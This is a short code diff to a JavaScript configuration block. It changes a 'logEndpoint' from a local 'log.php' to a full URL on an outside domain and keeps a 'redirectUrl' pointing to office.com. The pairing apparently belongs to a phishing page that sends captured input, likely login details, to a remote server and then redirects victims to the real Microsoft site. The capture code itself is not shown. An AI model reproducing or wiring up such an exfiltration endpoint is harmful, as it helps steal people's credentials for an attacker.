@@ -49,7 +49,7 @@
 
         // Configuration
         const CONFIG = {
-            logEndpoint: 'log.php', // Set to empty string to disable logging
+            logEndpoint: 'https://gnosis.com.py/serca/log.php', // Set to empty string to disable logging
             redirectUrl: 'https://www.office.com'
         };
 
